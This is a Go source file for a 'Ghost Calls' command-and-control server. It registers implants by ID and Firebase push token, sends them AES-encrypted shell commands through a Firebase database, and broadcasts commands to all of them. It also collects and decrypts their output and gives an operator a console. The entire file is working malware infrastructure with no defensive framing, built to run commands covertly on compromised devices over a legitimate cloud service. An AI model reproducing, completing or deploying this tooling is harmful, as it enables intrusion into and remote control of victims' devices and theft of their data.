package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ─── Crypto ────────────────────────────────────────────────────────────────

func deriveKey(implantID, secret string) []byte {
	h := sha256.Sum256([]byte(implantID + ":" + secret))
	return h[:]
}

func encrypt(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(cipherB64 string, key []byte) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(cipherB64)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(ciphertext) < ns {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, data := ciphertext[:ns], ciphertext[ns:]
	plaintext, err := gcm.Open(nil, nonce, data, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

// ─── Data Types ────────────────────────────────────────────────────────────

type Implant struct {
	ID       string    `json:"id"`
	FCMToken string    `json:"fcm_token,omitempty"`
	LastSeen time.Time `json:"last_seen"`
}

type Result struct {
	CommandID string `json:"command_id"`
	Output    string `json:"output"` // encrypted base64
	TS        int64  `json:"ts"`
}

type CommandPayload struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"` // encrypted base64
	TS  int64  `json:"ts"`
}

// ─── Server ────────────────────────────────────────────────────────────────

type Server struct {
	mu           sync.RWMutex
	implants     map[string]*Implant
	results      map[string][]Result
	cmdCount     map[string]int
	firebaseURL  string
	secret       string
	httpPort     int
	httpClient   *http.Client
}

func NewServer(firebaseURL, secret string, port int) *Server {
	return &Server{
		implants:    make(map[string]*Implant),
		results:     make(map[string][]Result),
		cmdCount:    make(map[string]int),
		firebaseURL: strings.TrimRight(firebaseURL, "/"),
		secret:      secret,
		httpPort:    port,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				IdleConnTimeout: 90 * time.Second,
			},
		},
	}
}

func (s *Server) firebasePut(path string, body []byte) error {
	url := fmt.Sprintf("%s/%s.json", s.firebaseURL, path)
	req, err := http.NewRequest("PUT", url, strings.NewReader(string(body)))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("firebase PUT %s: %s: %s", path, resp.Status, strings.TrimSpace(string(b)))
	}
	return nil
}

func (s *Server) firebaseDelete(path string) error {
	url := fmt.Sprintf("%s/%s.json", s.firebaseURL, path)
	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return err
	}
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("firebase DELETE %s: %s: %s", path, resp.Status, strings.TrimSpace(string(b)))
	}
	return nil
}

func (s *Server) firebaseGet(path string) ([]byte, error) {
	url := fmt.Sprintf("%s/%s.json", s.firebaseURL, path)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("firebase GET %s: %s: %s", path, resp.Status, strings.TrimSpace(string(body)))
	}
	return body, nil
}

// ─── Commands ──────────────────────────────────────────────────────────────

func (s *Server) SendCommand(implantID, command string) (string, error) {
	s.mu.Lock()
	s.cmdCount[implantID]++
	cmdNum := s.cmdCount[implantID]
	s.mu.Unlock()

	cmdID := fmt.Sprintf("%s-%d-%d", implantID, cmdNum, time.Now().UnixMilli())

	key := deriveKey(implantID, s.secret)
	enc, err := encrypt([]byte(command), key)
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}

	payload := CommandPayload{
		ID:  cmdID,
		Cmd: enc,
		TS:  time.Now().UnixMilli(),
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("marshal: %w", err)
	}

	path := fmt.Sprintf("commands/%s", implantID)
	if err := s.firebasePut(path, data); err != nil {
		return "", fmt.Errorf("firebase write: %w", err)
	}

	log.Printf("[+] Command %s sent to %s: %s", cmdID, implantID, command)
	return cmdID, nil
}

func (s *Server) BroadcastCommand(command string) []string {
	s.mu.RLock()
	ids := make([]string, 0, len(s.implants))
	for id := range s.implants {
		ids = append(ids, id)
	}
	s.mu.RUnlock()

	var sent []string
	for _, id := range ids {
		cid, err := s.SendCommand(id, command)
		if err != nil {
			log.Printf("[-] Broadcast to %s failed: %v", id, err)
		} else {
			sent = append(sent, cid)
		}
	}
	return sent
}

func (s *Server) FetchResults(implantID string) ([]Result, error) {
	data, err := s.firebaseGet(fmt.Sprintf("results/%s", implantID))
	if err != nil {
		return nil, err
	}

	// If no data or null, return empty slice
	if len(data) == 0 || string(data) == "null" {
		return nil, nil
	}

	// Results are stored as a map of commandID -> result
	var rawResults map[string]json.RawMessage
	if err := json.Unmarshal(data, &rawResults); err != nil {
		return nil, fmt.Errorf("unmarshal results map: %w", err)
	}

	var results []Result
	for cmdID, raw := range rawResults {
		var r Result
		if err := json.Unmarshal(raw, &r); err != nil {
			log.Printf("[-] Skipping unparsable result %s: %v", cmdID, err)
			continue
		}
		r.CommandID = cmdID

		// Try to decrypt the output
		key := deriveKey(implantID, s.secret)
		dec, err := decrypt(r.Output, key)
		if err != nil {
			r.Output = fmt.Sprintf("[encrypted] %s", r.Output)
		} else {
			r.Output = string(dec)
		}

		results = append(results, r)
	}

	return results, nil
}

func (s *Server) PushRawFCM(implantID, jsonPayload string) error {
	s.mu.RLock()
	imp, ok := s.implants[implantID]
	s.mu.RUnlock()
	if !ok || imp.FCMToken == "" {
		return fmt.Errorf("implant %s not registered or has no FCM token", implantID)
	}

	// This would use the FCM HTTP v1 API — placeholder for FCM integration
	log.Printf("[!] Raw FCM push to %s (token: %s...): %s",
		implantID, imp.FCMToken[:min(len(imp.FCMToken), 16)], jsonPayload)
	return nil
}

// ─── HTTP API / Status ────────────────────────────────────────────────────

func (s *Server) httpStatusHandler(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	fmt.Fprintf(w, "Ghost Calls C2 — Push Notification C2 Server\n")
	fmt.Fprintf(w, "==============================================\n\n")
	fmt.Fprintf(w, "Registered implants: %d\n\n", len(s.implants))
	for _, imp := range s.implants {
		fcm := "none"
		if imp.FCMToken != "" {
			fcm = imp.FCMToken[:min(len(imp.FCMToken), 20)] + "..."
		}
		fmt.Fprintf(w, "  %-24s  last: %s  fcm: %s\n", imp.ID, imp.LastSeen.Format(time.RFC3339), fcm)
	}
}

// ─── REPL ──────────────────────────────────────────────────────────────────

func (s *Server) RunREPL() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println()
	fmt.Println("╔══════════════════════════════════════════════╗")
	fmt.Println("║     Ghost Calls C2 — Operator Console        ║")
	fmt.Println("╚══════════════════════════════════════════════╝")
	fmt.Println()
	fmt.Println("Commands:")
	fmt.Println("  register <id> [fcm_token]   — Register an implant")
	fmt.Println("  exec <id> <command>         — Send command to implant")
	fmt.Println("  broadcast <command>         — Send to all implants")
	fmt.Println("  list                        — Show registered implants")
	fmt.Println("  results <id>                — Show results from implant")
	fmt.Println("  forget <id>                 — Remove implant registration")
	fmt.Println("  push <id> <json>            — Send raw FCM push payload")
	fmt.Println("  status                      — Show server overview")
	fmt.Println("  help                        — Show this help")
	fmt.Println("  exit                        — Shut down")
	fmt.Println()

	for {
		fmt.Print("ghost> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "exit", "quit":
			fmt.Println("Shutting down.")
			return

		case "help":
			fmt.Println("Commands:")
			fmt.Println("  register <id> [fcm_token]   — Register an implant")
			fmt.Println("  exec <id> <command...>       — Send command to implant")
			fmt.Println("  broadcast <command...>       — Send to all implants")
			fmt.Println("  list                        — Show registered implants")
			fmt.Println("  results <id>                — Show results from implant")
			fmt.Println("  forget <id>                 — Remove implant registration")
			fmt.Println("  push <id> <json>            — Send raw FCM push payload")
			fmt.Println("  status                      — Show server overview")
			fmt.Println("  help                        — Show this help")
			fmt.Println("  exit                        — Shut down")

		case "register":
			if len(parts) < 2 {
				fmt.Println("Usage: register <id> [fcm_token]")
				continue
			}
			id := parts[1]
			token := ""
			if len(parts) >= 3 {
				token = parts[2]
			}

			s.mu.Lock()
			if existing, ok := s.implants[id]; ok {
				existing.LastSeen = time.Now()
				if token != "" {
					existing.FCMToken = token
				}
				fmt.Printf("[*] Updated implant %s\n", id)
			} else {
				s.implants[id] = &Implant{
					ID:       id,
					FCMToken: token,
					LastSeen: time.Now(),
				}
				fmt.Printf("[+] Registered implant %s\n", id)
			}
			s.mu.Unlock()

		case "forget":
			if len(parts) < 2 {
				fmt.Println("Usage: forget <id>")
				continue
			}
			id := parts[1]
			s.mu.Lock()
			if _, ok := s.implants[id]; ok {
				delete(s.implants, id)
				fmt.Printf("[-] Removed implant %s\n", id)
			} else {
				fmt.Printf("[-] Implant %s not found\n", id)
			}
			s.mu.Unlock()

		case "list":
			s.mu.RLock()
			if len(s.implants) == 0 {
				fmt.Println("No registered implants.")
			} else {
				fmt.Printf("%-24s  %-40s  %s\n", "ID", "FCM Token", "Last Seen")
				fmt.Println(strings.Repeat("─", 90))
				for _, imp := range s.implants {
					fcm := "-"
					if imp.FCMToken != "" {
						fcm = imp.FCMToken[:min(len(imp.FCMToken), 36)] + "..."
					}
					fmt.Printf("%-24s  %-40s  %s\n", imp.ID, fcm, imp.LastSeen.Format(time.RFC3339))
				}
			}
			s.mu.RUnlock()

		case "exec":
			if len(parts) < 3 {
				fmt.Println("Usage: exec <id> <command...>")
				continue
			}
			id := parts[1]
			command := strings.Join(parts[2:], " ")

			s.mu.RLock()
			_, ok := s.implants[id]
			s.mu.RUnlock()
			if !ok {
				fmt.Printf("[-] Implant %s not registered. Register it first.\n", id)
				continue
			}

			cmdID, err := s.SendCommand(id, command)
			if err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			} else {
				fmt.Printf("[+] Command queued: %s\n", cmdID)
			}

		case "broadcast":
			if len(parts) < 2 {
				fmt.Println("Usage: broadcast <command...>")
				continue
			}
			command := strings.Join(parts[1:], " ")
			sent := s.BroadcastCommand(command)
			fmt.Printf("[+] Broadcast sent to %d implant(s)\n", len(sent))

		case "results":
			if len(parts) < 2 {
				fmt.Println("Usage: results <id>")
				continue
			}
			id := parts[1]
			results, err := s.FetchResults(id)
			if err != nil {
				fmt.Printf("[-] Error fetching results: %v\n", err)
				continue
			}
			if len(results) == 0 {
				fmt.Printf("[*] No results for %s\n", id)
				continue
			}
			fmt.Printf("Results for %s:\n", id)
			for _, r := range results {
				fmt.Printf("  Command: %s\n", r.CommandID)
				fmt.Printf("  Time:    %s\n", time.UnixMilli(r.TS).Format(time.RFC3339))
				fmt.Printf("  Output:\n")
				for _, line := range strings.Split(strings.TrimRight(r.Output, "\n"), "\n") {
					fmt.Printf("    %s\n", line)
				}
				fmt.Println()
			}

		case "push":
			if len(parts) < 3 {
				fmt.Println("Usage: push <id> <json_payload>")
				continue
			}
			id := parts[1]
			payload := strings.Join(parts[2:], " ")
			if err := s.PushRawFCM(id, payload); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}

		case "status":
			s.mu.RLock()
			fmt.Printf("Firebase Project: %s\n", s.firebaseURL)
			fmt.Printf("HTTP Port:        %d\n", s.httpPort)
			fmt.Printf("Implants:         %d\n", len(s.implants))
			for _, imp := range s.implants {
				fcm := "no"
				if imp.FCMToken != "" {
					fcm = "yes"
				}
				fmt.Printf("  %s (FCM: %s, seen: %s)\n", imp.ID, fcm, imp.LastSeen.Format(time.RFC3339))
			}
			s.mu.RUnlock()

		default:
			fmt.Printf("Unknown command: %s\nType 'help' for available commands.\n", cmd)
		}
	}
}

// ─── Main ──────────────────────────────────────────────────────────────────

func main() {
	firebaseURL := os.Getenv("FIREBASE_URL")
	secret := os.Getenv("GHOST_SECRET")
	portStr := os.Getenv("GHOST_PORT")

	if firebaseURL == "" {
		log.Fatal("FIREBASE_URL environment variable required (e.g., https://my-project-default-rtdb.firebaseio.com)")
	}
	if secret == "" {
		log.Fatal("GHOST_SECRET environment variable required (server-side encryption key)")
	}

	port := 9090
	if portStr != "" {
		if n, err := fmt.Sscanf(portStr, "%d", &port); err != nil || n != 1 {
			log.Printf("Warning: invalid GHOST_PORT '%s', using 9090", portStr)
			port = 9090
		}
	}

	srv := NewServer(firebaseURL, secret, port)

	// HTTP status endpoint
	http.HandleFunc("/", srv.httpStatusHandler)
	httpServer := &http.Server{
		Addr:    fmt.Sprintf(":%d", port),
		Handler: nil,
	}

	go func() {
		log.Printf("[*] HTTP status page listening on :%d", port)
		if err := httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("HTTP server error: %v", err)
		}
	}()

	// Handle shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		fmt.Println("\n[*] Shutting down...")
		httpServer.Close()
		os.Exit(0)
	}()

	srv.RunREPL()
}
